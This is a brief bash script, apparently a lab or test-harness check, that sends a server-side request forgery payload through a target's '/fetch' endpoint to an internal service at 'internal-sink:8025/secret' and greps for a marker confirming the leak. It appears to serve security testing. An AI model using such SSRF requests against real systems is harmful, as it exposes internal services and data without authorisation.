#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
curl -sG "$TARGET/fetch" --data-urlencode 'url=http://internal-sink:8025/secret' | grep -E 'INTERNAL-SINK-MARKER-jsp|Mailpit|internal sink'
